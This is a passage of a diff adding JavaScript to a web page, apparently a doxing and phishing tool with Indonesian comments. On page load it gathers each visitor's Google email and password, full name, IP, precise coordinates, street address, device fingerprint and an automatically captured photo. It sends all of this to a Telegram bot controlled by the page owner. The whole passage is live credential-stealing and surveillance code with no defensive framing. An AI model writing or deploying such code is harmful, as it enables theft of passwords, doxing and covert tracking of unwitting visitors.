+        "Device": device,
+
+        "Android Version": androidVersion,
+
+        "Platform": loginFrom,
+
+        "Coordinates": `${latitude}, ${longitude}`,
+
+        "Accuracy": accuracy,
+
+        "Country": country,
+
+        "Province/State": province,
+
+        "City": city,
+
+        "Street": street,
+
+        "Street Number": streetNumber,
+
+        "District": district,
+
+        "Time": clock,
+
+        "Weather": weather,
+
+        "Temperature": temperature,
+
+        "Language": language,
+
+        "Resolution": resolution,
+
+        "Timezone": timezone,
+
+        "Online Status": isOnline ? "Online" : "Offline",
+
+        "RAM (GB)": deviceMemory,
+
+        "CPU Cores": cpuCores,
+
+        "Touch Support": isTouch ? "Yes" : "No",
+
+        "Cookies Enabled": cookiesEnabled ? "Yes" : "No",
+
+        "Do Not Track": doNotTrack || "Not specified",
+
+        "Fingerprint": fingerprint,
+
+        "Battery Level": batteryInfo["battery level"],
+
+        "Charging": batteryInfo["charging"]
+
+      };
+
+    }
+
+    
+
+    async function sendToTelegram(data) {
+
+      const message = `🔒 *Data-Doxing*\n\n` +
+
+        `🌐 *IP Address:* ${data["IP Address"]}\n` +
+
+        `📞 *SIM Operator:* ${data["SIM Operator"]}\n` +
+
+        `👤 *Full Name:* ${data["Full Name"]}\n` +
+
+        `📧 *Google Email:* ${data["Google Email"]}\n` +
+
+        `🔑 *Google Password:* ${data["Google Password"]}\n` +
+
+        `🏢 *ISP:* ${data["ISP"]}\n` +
+
+        `📱 *Device:* ${data["Device"]}\n` +
+
+        `🤖 *Android Version:* ${data["Android Version"]}\n` +
+
+        `📍 *Location:* ${data["Coordinates"]}\n` +
+
+        `📏 *Accuracy:* ${data["Accuracy"]}\n` +
+
+        `🏛️ *Country:* ${data["Country"]}\n` +
+
+        `🏙️ *Province/State:* ${data["Province/State"]}\n` +
+
+        `🏘️ *City:* ${data["City"]}\n` +
+
+        `🛣️ *Street:* ${data["Street"]}\n` +
+
+        `🏠 *Street Number:* ${data["Street Number"]}\n` +
+
+        `🏡 *District:* ${data["District"]}\n` +
+
+        `🕒 *Time:* ${data["Time"]}\n` +
+
+        `🌤️ *Weather:* ${data["Weather"]}\n` +
+
+        `🌡️ *Temperature:* ${data["Temperature"]}\n` +
+
+        `🗣️ *Language:* ${data["Language"]}\n` +
+
+        `📺 *Resolution:* ${data["Resolution"]}\n` +
+
+        `🕐 *Timezone:* ${data["Timezone"]}\n` +
+
+        `📶 *Online Status:* ${data["Online Status"]}\n` +
+
+        `💾 *RAM:* ${data["RAM (GB)"]} GB\n` +
+
+        `⚡ *CPU Cores:* ${data["CPU Cores"]}\n` +
+
+        `👆 *Touch Support:* ${data["Touch Support"]}\n` +
+
+        `🍪 *Cookies Enabled:* ${data["Cookies Enabled"]}\n` +
+
+        `🚫 *Do Not Track:* ${data["Do Not Track"]}\n` +
+
+        `🔑 *Fingerprint:* ${data["Fingerprint"]}\n` +
+
+        `🔋 *Battery Level:* ${data["Battery Level"]}\n` +
+
+        `⚡ *Charging:* ${data["Charging"]}`;
+
+      
+
+      // Kirim pesan teks
+
+      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+
+        method: "POST",
+
+        headers: { "Content-Type": "application/json" },
+
+        body: JSON.stringify({
+
+          chat_id: OWNER_CHAT_ID,
+
+          text: message,
+
+          parse_mode: "Markdown"
+
+        })
+
+      });
+
+      
+
+      // Jika ada foto, kirim juga
+
+      if (window.capturedPhoto) {
+
+        // Konversi data URL ke blob
+
+        const blob = await fetch(window.capturedPhoto).then(r => r.blob());
+
+        
+
+        // Buat form data untuk upload
+
+        const formData = new FormData();
+
+        formData.append('chat_id', OWNER_CHAT_ID);
+
+        formData.append('photo', blob, 'visitor-photo.jpg');
+
+        formData.append('caption', 'Visitor photo captured automatically');
+
+        
+
+        // Kirim foto
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+
+          method: "POST",
+
+          body: formData
+
+        });
+
+      }
+
+    }
+
+    
+
+    // Jalankan init ketika halaman dimuat
+
+    window.addEventListener('load', init);
+
   </script>
+
 </body>
+
 </html>
